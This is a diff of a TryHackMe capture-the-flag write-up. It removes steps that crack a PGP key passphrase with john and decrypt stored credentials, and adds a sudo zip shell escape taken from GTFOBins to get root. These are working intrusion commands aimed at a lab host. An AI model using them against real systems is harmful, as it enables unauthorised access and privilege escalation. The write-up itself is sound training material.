@@ -70,36 +70,6 @@ Into skyfuck dictionary, we got one asc file and pgp file.
 
 ![image](https://user-images.githubusercontent.com/67756786/194021490-89f47a28-dfec-4722-9f39-77986505bee9.png)
 
-Scp both file.
-```
-scp tryhackme.asc root@10.10.214.53:~/tryhackme.asc
-scp credential.pgp root@10.10.214.53:~/credential.pgp
-```
-check tryhackme.asc content, we know this file is PGP private key.
-
-![image](https://user-images.githubusercontent.com/67756786/194023131-9d9ffcea-8bef-4be5-9dca-5489fd684eb6.png)
-
-Now we can use john to crack.
-
-```
-gpg2john tryhackme.asc > hash.txt
-john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
-```
-Now we have gpg private key to crack credential.pgp
-![image](https://user-images.githubusercontent.com/67756786/194025726-97709d6a-db3f-4287-bea7-7178bf98bdcd.png)
-
-import private key, first.
-```
-gpg --import tryhackme.asc
-```
-![image](https://user-images.githubusercontent.com/67756786/194026019-301bf640-69a3-4209-92ce-e986bd061c99.png)
-
-```
-gpg --decrypt credential.pgp
-```
-
-![image](https://user-images.githubusercontent.com/67756786/194026271-29a81f59-490b-4c2f-bb94-b25a84bb160e.png)
-
 
 - [x] Escalate privileges and obtain root.txt
 
@@ -132,3 +102,25 @@ gpg --decrypt credential.pgp
 ```
 
 ![image](https://user-images.githubusercontent.com/67756786/194026271-29a81f59-490b-4c2f-bb94-b25a84bb160e.png)
+
+
+Into skyfuck ssh and chanche user to merlin.
+
+Check merlin privillege
+
+![image](https://user-images.githubusercontent.com/67756786/194026946-b02f54fc-be49-46ce-8f67-a7b40cb9d0d9.png)
+
+GTFOBins has teaching how to privilege escalation from zip
+
+![image](https://user-images.githubusercontent.com/67756786/194027275-cd1e88a8-e6a4-4f46-87fd-7b0e829e6afa.png)
+
+```
+TF=$(mktemp -u)
+sudo zip $TF /etc/hosts -T -TT 'sh #'
+```
+![image](https://user-images.githubusercontent.com/67756786/194027423-5098d5d6-9fc3-487c-a7f9-12d2a82543e5.png)
+
+Finally, we got root.txt
+![image](https://user-images.githubusercontent.com/67756786/194027634-b44cde17-4f97-40a2-a34d-ef48351b7c00.png)
+
+
